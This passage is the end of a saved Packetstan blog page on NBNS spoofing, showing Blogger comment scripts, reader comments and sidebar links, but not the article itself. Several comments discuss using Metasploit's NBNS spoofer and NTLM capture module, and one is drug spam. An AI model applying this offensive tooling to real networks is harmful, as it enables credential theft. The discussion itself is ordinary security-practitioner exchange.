PM', 'deleteclass': 'item-control blog-admin pid-111038732'}, {'id': '6763108132047232870', 'body': 'Great article but am having a problem with the NBNS spoofer giving me an error and kills the job. Have tried multiple Spoof ip\46#39;s but seems not to work. The error messages say ENETUNREACH Network is unreachable as I am on the network unless it is trying to reach another machine on another network? ', 'timestamp': '1353447735218', 'permalink': 'http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html?showComment\0751353447735218#c6763108132047232870', 'author': {'name': 'Lance Garcia', 'avatarUrl': 'http://img2.blogblog.com/img/b16-rounded.gif', 'profileUrl': 'http://www.blogger.com/profile/12469502059476608879'}, 'displayTime': 'November 20, 2012 at 1:42 PM', 'deleteclass': 'item-control blog-admin pid-520060225'}];
      var msgs = {'loadMore': 'Load more...', 'loading': 'Loading...', 'loaded': 'No more!', 'addComment': 'Add comment', 'reply': 'Reply', 'delete': 'Delete'};
      var config = {'blogId': '6256684586716847588', 'postId': '4934681323479353937', 'feed': 'http://www.packetstan.com/feeds/4934681323479353937/comments/default', 'authorName': 'Tim Medin', 'authorUrl': 'http://www.blogger.com/profile/15437442280236308195', 'baseUri': 'http://www.blogger.com', 'maxThreadDepth': 2};

// <![CDATA[
      var cursor = null;
      if (items && items.length > 0) {
        cursor = parseInt(items[items.length - 1].timestamp) + 1;
      }

      var bodyFromEntry = function(entry) {
        if (entry.gd$extendedProperty) {
          for (var k in entry.gd$extendedProperty) {
            if (entry.gd$extendedProperty[k].name == 'blogger.contentRemoved') {
              return '<span class="deleted-comment">' + entry.content.$t + '</span>';
            }
          }
        }
        return entry.content.$t;
      }

      var parse = function(data) {
        cursor = null;
        var comments = [];
        if (data && data.feed && data.feed.entry) {
          for (var i = 0, entry; entry = data.feed.entry[i]; i++) {
            var comment = {};
            // comment ID, parsed out of the original id format
            var id = /blog-(\d+).post-(\d+)/.exec(entry.id.$t);
            comment.id = id ? id[2] : null;
            comment.body = bodyFromEntry(entry);
            comment.timestamp = Date.parse(entry.published.$t) + '';
            if (entry.author && entry.author.constructor === Array) {
              var auth = entry.author[0];
              if (auth) {
                comment.author = {
                  name: (auth.name ? auth.name.$t : undefined),
                  profileUrl: (auth.uri ? auth.uri.$t : undefined),
                  avatarUrl: (auth.gd$image ? auth.gd$image.src : undefined)
                };
              }
            }
            if (entry.link) {
              if (entry.link[2]) {
                comment.link = comment.permalink = entry.link[2].href;
              }
              if (entry.link[3]) {
                var pid = /.*comments\/default\/(\d+)\?.*/.exec(entry.link[3].href);
                if (pid && pid[1]) {
                  comment.parentId = pid[1];
                }
              }
            }
            comment.deleteclass = 'item-control blog-admin';
            if (entry.gd$extendedProperty) {
              for (var k in entry.gd$extendedProperty) {
                if (entry.gd$extendedProperty[k].name == 'blogger.itemClass') {
                  comment.deleteclass += ' ' + entry.gd$extendedProperty[k].value;
                } else if (entry.gd$extendedProperty[k].name == 'blogger.displayTime') {
                  comment.displayTime = entry.gd$extendedProperty[k].value;
                }
              }
            }
            comments.push(comment);
          }
        }
        return comments;
      };

      var paginator = function(callback) {
        if (hasMore()) {
          var url = config.feed + '?alt=json&v=2&orderby=published&reverse=false&max-results=50';
          if (cursor) {
            url += '&published-min=' + new Date(cursor).toISOString();
          }
          window.bloggercomments = function(data) {
            var parsed = parse(data);
            cursor = parsed.length < 50 ? null
                : parseInt(parsed[parsed.length - 1].timestamp) + 1
            callback(parsed);
            window.bloggercomments = null;
          }
          url += '&callback=bloggercomments';
          var script = document.createElement('script');
          script.type = 'text/javascript';
          script.src = url;
          document.getElementsByTagName('head')[0].appendChild(script);
        }
      };
      var hasMore = function() {
        return !!cursor;
      };
      var getMeta = function(key, comment) {
        if ('iswriter' == key) {
          var matches = !!comment.author
              && comment.author.name == config.authorName
              && comment.author.profileUrl == config.authorUrl;
          return matches ? 'true' : '';
        } else if ('deletelink' == key) {
          return config.baseUri + '/delete-comment.g?blogID='
               + config.blogId + '&postID=' + comment.id;
        } else if ('deleteclass' == key) {
          return comment.deleteclass;
        }
        return '';
      };

      var replybox = null;
      var replyUrlParts = null;
      var replyParent = undefined;

      var onReply = function(commentId, domId) {
        if (replybox == null) {
          // lazily cache replybox, and adjust to suit this style:
          replybox = document.getElementById('comment-editor');
          if (replybox != null) {
            replybox.height = '250px';
            replybox.style.display = 'block';
            replyUrlParts = replybox.src.split('#');
          }
        }
        if (replybox && (commentId !== replyParent)) {
          document.getElementById(domId).insertBefore(replybox, null);
          replybox.src = replyUrlParts[0]
              + (commentId ? '&parentID=' + commentId : '')
              + '#' + replyUrlParts[1];
          replyParent = commentId;
        }
      };

      var hash = (window.location.hash || '#').substring(1);
      var startThread, targetComment;
      if (/^comment-form_/.test(hash)) {
        startThread = hash.substring('comment-form_'.length);
      } else if (/^c[0-9]+$/.test(hash)) {
        targetComment = hash.substring(1);
      }

      // Configure commenting API:
      var configJso = {
        'maxDepth': config.maxThreadDepth
      };
      var provider = {
        'id': config.postId,
        'data': items,
        'loadNext': paginator,
        'hasMore': hasMore,
        'getMeta': getMeta,
        'onReply': onReply,
        'rendered': true,
        'initComment': targetComment,
        'initReplyThread': startThread,
        'config': configJso,
        'messages': msgs
      };

      var render = function() {
        if (window.goog && window.goog.comments) {
          var holder = document.getElementById('comment-holder');
          window.goog.comments.render(holder, provider);
        }
      };

      // render now, or queue to render when library loads:
      if (window.goog && window.goog.comments) {
        render();
      } else {
        window.goog = window.goog || {};
        window.goog.comments = window.goog.comments || {};
        window.goog.comments.loadQueue = window.goog.comments.loadQueue || [];
        window.goog.comments.loadQueue.push(render);
      }
    })();
// ]]>
</script>
<div id="comment-holder">
<div id="bc_0_7C" kind="c"><div id="bc_0_7CT"><div id="bc_0_6T" class="comment-thread" kind="r" t="0" u="0"><ol id="bc_0_6TB"><li id="bc_0_0B" class="comment" kind="b"><div class="avatar-image-container"><img src="nbns-spoofing-on-your-way-to-world_files/openid36-rounded.png"></div><div id="c9030356344735498897" class="comment-block"><div id="bc_0_0M" class="comment-header" kind="m"><cite class="user"><a rel="nofollow" href="http://openid.aol.com/scr0tumshine667">The Messenger</a></cite><span class="icon user"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html?showComment=1301674441169#c9030356344735498897">April 1, 2011 at 9:14 AM</a></span></div><p id="bc_0_0MC" class="comment-content">Nice work. Very Offensive I might add</p><span id="bc_0_0MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-135424602"><a o="d" target="_self" href="http://www.blogger.com/delete-comment.g?blogID=6256684586716847588&amp;postID=9030356344735498897">Delete</a></span></span></div><div id="bc_0_0BR" class="comment-replies"></div><div id="bc_0_0B_box" class="comment-replybox-single"></div></li><li id="bc_0_1B" class="comment" kind="b"><div class="avatar-image-container"><img src="nbns-spoofing-on-your-way-to-world_files/b36-rounded.png"></div><div id="c1885634673877669094" class="comment-block"><div id="bc_0_1M" class="comment-header" kind="m"><cite class="user"><a rel="nofollow" href="http://www.blogger.com/profile/16770625815804345800">mvelazco</a></cite><span class="icon user"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html?showComment=1302112544794#c1885634673877669094">April 6, 2011 at 10:55 AM</a></span></div><p id="bc_0_1MC" class="comment-content">Great post ! thanks for sharing.<br><br>I
 have a question, when the auxiliary/server/capture/http_ntlm module 
presents the challenge will the ntlm hash be provided without any user 
(victim) interaction ?<br><br>Greetings from Peru</p><span id="bc_0_1MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-245925734"><a o="d" target="_self" href="http://www.blogger.com/delete-comment.g?blogID=6256684586716847588&amp;postID=1885634673877669094">Delete</a></span></span></div><div id="bc_0_1BR" class="comment-replies"></div><div id="bc_0_1B_box" class="comment-replybox-single"></div></li><li id="bc_0_2B" class="comment" kind="b"><div class="avatar-image-container"><img src="nbns-spoofing-on-your-way-to-world_files/Screen252Bshot252B2011-03-11252Bat252B11.png"></div><div id="c8128291457810057213" class="comment-block"><div id="bc_0_2M" class="comment-header" kind="m"><cite class="user"><a rel="nofollow" href="http://www.blogger.com/profile/09655591809270593462">Silas Cutler</a></cite><span class="icon user"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html?showComment=1302793664002#c8128291457810057213">April 14, 2011 at 8:07 AM</a></span></div><p id="bc_0_2MC" class="comment-content">Absolutely fantastic post.</p><span id="bc_0_2MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-389987173"><a o="d" target="_self" href="http://www.blogger.com/delete-comment.g?blogID=6256684586716847588&amp;postID=8128291457810057213">Delete</a></span></span></div><div id="bc_0_2BR" class="comment-replies"></div><div id="bc_0_2B_box" class="comment-replybox-single"></div></li><li id="bc_0_3B" class="comment" kind="b"><div class="avatar-image-container"><img src="nbns-spoofing-on-your-way-to-world_files/openid36-rounded.png"></div><div id="c4242686565282227198" class="comment-block"><div id="bc_0_3M" class="comment-header" kind="m"><cite class="user"><a rel="nofollow" href="http://mudupock.wordpress.com/">mudupock</a></cite><span class="icon user"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html?showComment=1302854510951#c4242686565282227198">April 15, 2011 at 1:01 AM</a></span></div><p id="bc_0_3MC" class="comment-content">Super-Duper site! I am loving it!! Will come back again â€“ taking your RSS feeds also, Thanks.<br><br><a href="http://consultantmediconline.com/#176" rel="nofollow">nolvadex</a></p><span id="bc_0_3MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-2069443078"><a o="d" target="_self" href="http://www.blogger.com/delete-comment.g?blogID=6256684586716847588&amp;postID=4242686565282227198">Delete</a></span></span></div><div id="bc_0_3BR" class="comment-replies"></div><div id="bc_0_3B_box" class="comment-replybox-single"></div></li><li id="bc_0_4B" class="comment" kind="b"><div class="avatar-image-container"><img src="nbns-spoofing-on-your-way-to-world_files/b36-rounded.png"></div><div id="c9142416299971857712" class="comment-block"><div id="bc_0_4M" class="comment-header" kind="m"><cite class="user"><a rel="nofollow" href="http://www.blogger.com/profile/18074871266223305762">Digininja</a></cite><span class="icon user"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html?showComment=1327438013271#c9142416299971857712">January 24, 2012 at 12:46 PM</a></span></div><p id="bc_0_4MC" class="comment-content">Great
 article, just one comment. VERBOSE is off by default so you won't see 
the "[*] Regex matched PACKETSTAN from 192.168.1.51. Sending reply..." 
message.<br><br>And with the current release VERBOSE isn't shown as a 
basic option so you have to know it is there to enable it. For those who
 don't know how to it is a simple:<br><br>set VERBOSE true</p><span id="bc_0_4MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-111038732"><a o="d" target="_self" href="http://www.blogger.com/delete-comment.g?blogID=6256684586716847588&amp;postID=9142416299971857712">Delete</a></span></span></div><div id="bc_0_4BR" class="comment-replies"></div><div id="bc_0_4B_box" class="comment-replybox-single"></div></li><li id="bc_0_5B" class="comment" kind="b"><div class="avatar-image-container"><img src="nbns-spoofing-on-your-way-to-world_files/b36-rounded.png"></div><div id="c6763108132047232870" class="comment-block"><div id="bc_0_5M" class="comment-header" kind="m"><cite class="user"><a rel="nofollow" href="http://www.blogger.com/profile/12469502059476608879">Lance Garcia</a></cite><span class="icon user"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html?showComment=1353447735218#c6763108132047232870">November 20, 2012 at 1:42 PM</a></span></div><p id="bc_0_5MC" class="comment-content">Great
 article but am having a problem with the NBNS spoofer giving me an 
error and kills the job. Have tried multiple Spoof ip's but seems not to
 work. The error messages say ENETUNREACH Network is unreachable as I am
 on the network unless it is trying to reach another machine on another 
network? </p><span id="bc_0_5MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-520060225"><a o="d" target="_self" href="http://www.blogger.com/delete-comment.g?blogID=6256684586716847588&amp;postID=6763108132047232870">Delete</a></span></span></div><div id="bc_0_5BR" class="comment-replies"></div><div id="bc_0_5B_box" class="comment-replybox-single"></div></li></ol><div id="bc_0_6I" class="continue" kind="ci"><a href="javascript:;" target="_self">Add comment</a></div><div id="bc_0_6T_box" class="comment-replybox-thread"></div><div id="bc_0_6L" class="loadmore loaded" kind="rb"><a href="javascript:;" target="_self">Load more...</a></div></div></div></div>
</div>
</div>
<p class="comment-footer">
</p><div class="comment-form">
<a name="comment-form"></a>
<p>
</p>
<a href="http://www.blogger.com/comment-iframe.g?blogID=6256684586716847588&amp;postID=4934681323479353937&amp;blogspotRpcToken=3957359" id="comment-editor-src"></a>
<iframe allowtransparency="true" class="blogger-iframe-colorize blogger-comment-from-post" id="comment-editor" name="comment-editor" src="nbns-spoofing-on-your-way-to-world_files/comment-iframe.html" width="100%" frameborder="0" height="240px"></iframe>
<script type="text/javascript" src="nbns-spoofing-on-your-way-to-world_files/314201885-comment_from_post_iframe.js"></script>
<script type="text/javascript">
      BLOG_CMT_createIframe('http://www.blogger.com/rpc_relay.html', '14397355888617849878');
    </script>
</div>
<p></p>
<div id="backlinks-container">
<div id="Blog1_backlinks-container">
</div>
</div>
</div>
</div>

        </div></div>
      
<!-- google_ad_section_end -->
</div>
<div class="blog-pager" id="blog-pager">
<span id="blog-pager-newer-link">
<a class="blog-pager-newer-link" href="http://www.packetstan.com/2011/04/crafting-overlapping-fragments.html" id="Blog1_blog-pager-newer-link" title="Newer Post">Newer Post</a>
</span>
<span id="blog-pager-older-link">
<a class="blog-pager-older-link" href="http://www.packetstan.com/2011/03/extracting-ap-names-from-packet.html" id="Blog1_blog-pager-older-link" title="Older Post">Older Post</a>
</span>
<a class="home-link" href="http://www.packetstan.com/">Home</a>
</div>
<div class="clear"></div>
<div class="post-feeds">
<div class="feed-links">
Subscribe to:
<a class="feed-link" href="http://www.packetstan.com/feeds/4934681323479353937/comments/default" target="_blank" type="application/atom+xml">Post Comments (Atom)</a>
</div>
</div>
<script type="text/javascript">window.___gcfg = {'lang': 'en'};</script>
</div></div>
</div>
</div>
<div class="column-left-outer">
<div class="column-left-inner">
<aside>
</aside>
</div>
</div>
<div class="column-right-outer">
<div class="column-right-inner">
<aside>
<div class="sidebar section" id="sidebar-right-1"><div class="widget Text" id="Text1">
<h2 class="title">Contact Us:</h2>
<div class="widget-content">
Twitter:<br><div><a href="http://twitter.com/judy_novak">Judy Novak</a></div><div><a href="http://twitter.com/joswr1ght">Josh Wright</a></div><div><a href="http://twitter.com/timmedin">Tim Medin</a></div><div><a href="http://twitter.com/judy_novak"></a><a href="http://twitter.com/mike_poor">Mike Poor</a></div><div><br></div><div>Email:</div><div>packetstan[at]gmail[dot]com</div>
</div>
<div class="clear"></div>
<span class="widget-item-control">
<span class="item-control blog-admin">
<a class="quickedit" href="http://www.blogger.com/rearrange?blogID=6256684586716847588&amp;widgetType=Text&amp;widgetId=Text1&amp;action=editWidget&amp;sectionId=sidebar-right-1" onclick='return _WidgetManager._PopupConfig(document.getElementById("Text1"));' target="configText1" title="Edit">
<img alt="" src="nbns-spoofing-on-your-way-to-world_files/icon18_wrench_allbkg.png" width="18" height="18">
</a>
</span>
</span>
<div class="clear"></div>
</div><div class="widget BlogArchive" id="BlogArchive1">
<h2>Blog Archive</h2>
<div class="widget-content">
<div id="ArchiveList">
<div id="BlogArchive1_ArchiveList">
<ul class="hierarchy">
<li class="archivedate expanded">
<a class="toggle" href="javascript:void(0)">
<span class="zippy toggle-open">▼&nbsp;</span>
</a>
<a class="post-count-link" href="http://www.packetstan.com/search?updated-min=2011-01-01T00:00:00-08:00&amp;updated-max=2012-01-01T00:00:00-08:00&amp;max-results=9">2011</a>
<span class="post-count" dir="ltr">(9)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

          ►&nbsp;
        
</span>
</a>
<a class="post-count-link" href="http://www.packetstan.com/2011_08_01_archive.html">August</a>
<span class="post-count" dir="ltr">(2)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

          ►&nbsp;
        
</span>
</a>
<a class="post-count-link" href="http://www.packetstan.com/2011_05_01_archive.html">May</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

          ►&nbsp;
        
</span>
</a>
<a class="post-count-link" href="http://www.packetstan.com/2011_04_01_archive.html">April</a>
<span class="post-count" dir="ltr">(3)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate expanded">
<a class="toggle" href="javascript:void(0)">
<span class="zippy toggle-open">▼&nbsp;</span>
</a>
<a class="post-count-link" href="http://www.packetstan.com/2011_03_01_archive.html">March</a>
<span class="post-count" dir="ltr">(2)</span>
<ul class="posts">
<li><a href="http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html">NBNS Spoofing on your way to World Domination</a></li>
<li><a href="http://www.packetstan.com/2011/03/extracting-ap-names-from-packet.html">Extracting AP names from Packet Captures</a></li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

          ►&nbsp;
        
</span>
</a>
<a class="post-count-link" href="http://www.packetstan.com/2011_02_01_archive.html">February</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

          ►&nbsp;
        
</span>
</a>
<a class="post-count-link" href="http://www.packetstan.com/search?updated-min=2010-01-01T00:00:00-08:00&amp;updated-max=2011-01-01T00:00:00-08:00&amp;max-results=16">2010</a>
<span class="post-count" dir="ltr">(16)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

          ►&nbsp;
        
</span>
</a>
<a class="post-count-link" href="http://www.packetstan.com/2010_12_01_archive.html">December</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

          ►&nbsp;
        
</span>
</a>
<a class="post-count-link" href="http://www.packetstan.com/2010_11_01_archive.html">November</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

          ►&nbsp;
        
</span>
</a>
<a class="post-count-link" href="http://www.packetstan.com/2010_09_01_archive.html">September</a>
<span class="post-count" dir="ltr">(3)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

          ►&nbsp;
        
</span>
</a>
<a class="post-count-link" href="http://www.packetstan.com/2010_08_01_archive.html">August</a>
<span class="post-count" dir="ltr">(2)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

          ►&nbsp;
        
</span>
</a>
<a class="post-count-link" href="http://www.packetstan.com/2010_07_01_archive.html">July</a>
<span class="post-count" dir="ltr">(5)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

          ►&nbsp;
        
</span>
</a>
<a class="post-count-link" href="http://www.packetstan.com/2010_06_01_archive.html">June</a>
<span class="post-count" dir="ltr">(4)</span>
</li>
</ul>
</li>
</ul>
</div>
</div>
<div class="clear"></div>
<span class="widget-item-control">
<span class="item-control blog-admin">
<a class="quickedit" href="http://www.blogger.com/rearrange?blogID=6256684586716847588&amp;widgetType=BlogArchive&amp;widgetId=BlogArchive1&amp;action=editWidget&amp;sectionId=sidebar-right-1" onclick='return _WidgetManager._PopupConfig(document.getElementById("BlogArchive1"));' target="configBlogArchive1" title="Edit">
<img alt="" src="nbns-spoofing-on-your-way-to-world_files/icon18_wrench_allbkg.png" width="18" height="18">
</a>
</span>
</span>
<div class="clear"></div>
</div>
</div><div class="widget Profile" id="Profile1">
<h2>Contributors</h2>
<div class="widget-content">
<ul>
<li><a data-gapiattached="true" data-onload="true" data-gapiscan="true" class="profile-name-link g-profile" href="http://www.blogger.com/profile/17876103130871711653" style="background-image: url(//www.blogger.com/img/logo-16.png);">Mike Poor</a></li>
<li><a data-gapiattached="true" data-onload="true" data-gapiscan="true" class="profile-name-link g-profile" href="http://www.blogger.com/profile/09315219717596752149" style="background-image: url(//www.blogger.com/img/logo-16.png);">Joshua Wright</a></li>
<li><a data-gapiattached="true" data-onload="true" data-gapiscan="true" class="profile-name-link g-profile" href="http://www.blogger.com/profile/09261837204289632199" style="background-image: url(//www.blogger.com/img/logo-16.png);">Judy Novak</a></li>
<li><a data-gapiattached="true" data-onload="true" data-gapiscan="true" class="profile-name-link g-profile" href="http://www.blogger.com/profile/15437442280236308195" style="background-image: url(//www.blogger.com/img/logo-16.png);">Tim Medin</a></li>
</ul>
<div class="clear"></div>
<span class="widget-item-control">
<span class="item-control blog-admin">
<a class="quickedit" href="http://www.blogger.com/rearrange?blogID=6256684586716847588&amp;widgetType=Profile&amp;widgetId=Profile1&amp;action=editWidget&amp;sectionId=sidebar-right-1" onclick='return _WidgetManager._PopupConfig(document.getElementById("Profile1"));' target="configProfile1" title="Edit">
<img alt="" src="nbns-spoofing-on-your-way-to-world_files/icon18_wrench_allbkg.png" width="18" height="18">
</a>
</span>
</span>
<div class="clear"></div>
</div>
</div><div class="widget LinkList" id="LinkList1">
<h2>Links to Training Events</h2>
<div class="widget-content">
<ul>
<li><a href="http://www.sans.org/sansfire-2011/description.php?tid=4467">Learning how vulnerable wireless keyboards are with Josh in DC 7/15/2011</a></li>
<li><a href="http://www.sans.org/vlive/description.php?tid=4467">Learn Wireless Hacking with Josh from home with SANS vLive! starting 4/19/2011</a></li>
<li><a href="http://www.sans.org/security-west-2011/description.php?tid=510">Catch up with Mike in San Diego for SANS Security West, 5/3/2011</a></li>
<li><a href="http://www.sans.org/phoenix-2011">Escape the Winter! Mike teaches SEC503 Intrusion Detection In-Depth in Phoenix 2/25/2011</a></li>
</ul>
<div class="clear"></div>
<span class="widget-item-control">
<span class="item-control blog-admin">
<a class="quickedit" href="http://www.blogger.com/rearrange?blogID=6256684586716847588&amp;widgetType=LinkList&amp;widgetId=LinkList1&amp;action=editWidget&amp;sectionId=sidebar-right-1" onclick='return _WidgetManager._PopupConfig(document.getElementById("LinkList1"));' target="configLinkList1" title="Edit">
<img alt="" src="nbns-spoofing-on-your-way-to-world_files/icon18_wrench_allbkg.png" width="18" height="18">
</a>
</span>
</span>
<div class="clear"></div>
</div>
</div></div>
</aside>
</div>
</div>
</div>
<div style="clear: both"></div>
<!-- columns -->
</div>
<!-- main -->
</div>
</div>
<div class="main-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<footer>
<div class="footer-outer">
<div class="footer-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left footer-fauxborder-left">
<div class="fauxborder-right footer-fauxborder-right"></div>
<div class="region-inner footer-inner">
<div class="foot section" id="footer-1"></div>
<table class="section-columns columns-2" border="0" cellpadding="0" cellspacing="0">
<tbody>
<tr>
<td class="first columns-cell">
<div class="foot section" id="footer-2-1"></div>
</td>
<td class="columns-cell">
<div class="foot section" id="footer-2-2"></div>
</td>
</tr>
</tbody>
</table>
<!-- outside of the include in order to lock Attribution widget -->
<div class="foot section" id="footer-3"><div class="widget Attribution" id="Attribution1">
<div class="widget-content" style="text-align: center;">
Awesome Inc. template. Powered by <a href="http://www.blogger.com/" target="_blank">Blogger</a>.
</div>
<div class="clear"></div>
<span class="widget-item-control">
<span class="item-control blog-admin">
<a class="quickedit" href="http://www.blogger.com/rearrange?blogID=6256684586716847588&amp;widgetType=Attribution&amp;widgetId=Attribution1&amp;action=editWidget&amp;sectionId=footer-3" onclick='return _WidgetManager._PopupConfig(document.getElementById("Attribution1"));' target="configAttribution1" title="Edit">
<img alt="" src="nbns-spoofing-on-your-way-to-world_files/icon18_wrench_allbkg.png" width="18" height="18">
</a>
</span>
</span>
<div class="clear"></div>
</div></div>
</div>
</div>
<div class="footer-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</footer>
<!-- content -->
</div>
</div>
<div class="content-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<script type="text/javascript">
    window.setTimeout(function() {
        document.body.className = document.body.className.replace('loading', '');
      }, 10);
  </script>
<script type="text/javascript">
if (window.jstiming) window.jstiming.load.tick('widgetJsBefore');
</script><script type="text/javascript" src="nbns-spoofing-on-your-way-to-world_files/3934819169-widgets.js"></script>
<script gapi_processed="true" type="text/javascript" src="navbar_data/plusone.js"></script>
<script type="text/javascript">
if (typeof(BLOG_attachCsiOnload) != 'undefined' && BLOG_attachCsiOnload != null) { window['blogger_templates_experiment_id'] = "templatesV2";window['blogger_blog_id'] = '6256684586716847588';BLOG_attachCsiOnload('item_'); }_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d6256684586716847588','//www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html','6256684586716847588');
_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '6256684586716847588', 'bloggerUrl': 'http://www.blogger.com', 'title': 'Packetstan', 'pageType': 'item', 'url': 'http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html', 'canonicalUrl': 'http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html', 'canonicalHomepageUrl': 'http://www.packetstan.com/', 'homepageUrl': 'http://www.packetstan.com/', 'blogspotFaviconUrl': 'http://www.packetstan.com/favicon.ico', 'enabledCommentProfileImages': true, 'adultContent': false, 'disableAdSenseWidget': false, 'analyticsAccountNumber': '', 'searchLabel': '', 'searchQuery': '', 'pageName': 'NBNS Spoofing on your way to World Domination', 'pageTitle': 'Packetstan: NBNS Spoofing on your way to World Domination', 'encoding': 'UTF-8', 'locale': 'en', 'localeLanguage': 'en', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'languageDirection': 'ltr', 'feedLinks': '\74link rel\75\42alternate\42 type\75\42application/atom+xml\42 title\75\42Packetstan - Atom\42 href\75\42http://www.packetstan.com/feeds/posts/default\42 /\76\n\74link rel\75\42alternate\42 type\75\42application/rss+xml\42 title\75\42Packetstan - RSS\42 href\75\42http://www.packetstan.com/feeds/posts/default?alt\75rss\42 /\76\n\74link rel\75\42service.post\42 type\75\42application/atom+xml\42 title\75\42Packetstan - Atom\42 href\75\42http://www.blogger.com/feeds/6256684586716847588/posts/default\42 /\76\n\74link rel\75\42EditURI\42 type\75\42application/rsd+xml\42 title\75\42RSD\42 href\75\42http://www.blogger.com/rsd.g?blogID\0756256684586716847588\42 /\76\n\74link rel\75\42alternate\42 type\75\42application/atom+xml\42 title\75\42Packetstan - Atom\42 href\75\42http://www.packetstan.com/feeds/4934681323479353937/comments/default\42 /\76\n', 'meTag': '', 'openIdOpTag': '', 'postImageThumbnailUrl': 'http://2.bp.blogspot.com/-_5j2sGP7M0w/TZTwwWcWEgI/AAAAAAAAACE/7_ujJfrecHU/s72-c/nbnsscreenshot-smaller.png', 'imageSrcTag': '\74link rel\75\42image_src\42 href\75\42http://2.bp.blogspot.com/-_5j2sGP7M0w/TZTwwWcWEgI/AAAAAAAAACE/7_ujJfrecHU/s72-c/nbnsscreenshot-smaller.png\42 /\76\n', 'latencyHeadScript': '\74script type\75\42text/javascript\42\76(function() { var b\75window,e\75\42jstiming\42,g\75\42tick\42;(function(){function d(a){this.t\75{};this.tick\75function(a,d,c){c\75void 0!\75c?c:(new Date).getTime();this.t[a]\75[c,d]};this[g](\42start\42,null,a)}var a\75new d;b.jstiming\75{Timer:d,load:a};if(b.performance\46\46b.performance.timing){var a\75b.performance.timing,c\75b[e].load,f\75a.navigationStart,a\75a.responseStart;0\74f\46\46a\76\75f\46\46(c[g](\42_wtsrt\42,void 0,f),c[g](\42wtsrt_\42,\42_wtsrt\42,a),c[g](\42tbsd_\42,\42wtsrt_\42))}try{a\75null,b.chrome\46\46b.chrome.csi\46\46(a\75Math.floor(b.chrome.csi().pageT),c\46\0460\74f\46\46(c[g](\42_tbnd\42,void 0,b.chrome.csi().startE),\nc[g](\42tbnd_\42,\42_tbnd\42,f))),null\75\75a\46\46b.gtbExternal\46\46(a\75b.gtbExternal.pageT()),null\75\75a\46\46b.external\46\46(a\75b.external.pageT,c\46\0460\74f\46\46(c[g](\42_tbnd\42,void 0,b.external.startE),c[g](\42tbnd_\42,\42_tbnd\42,f))),a\46\46(b[e].pt\75a)}catch(l){}})();b.tickAboveFold\75function(d){var a\0750;if(d.offsetParent){do a+\75d.offsetTop;while(d\75d.offsetParent)}d\75a;750\76\75d\46\46b[e].load[g](\42aft\42)};var h\75!1;function k(){h||(h\75!0,b[e].load[g](\42firstScrollTime\42))}b.addEventListener?b.addEventListener(\42scroll\42,k,!1):b.attachEvent(\42onscroll\42,k);\n })();\74/script\076', 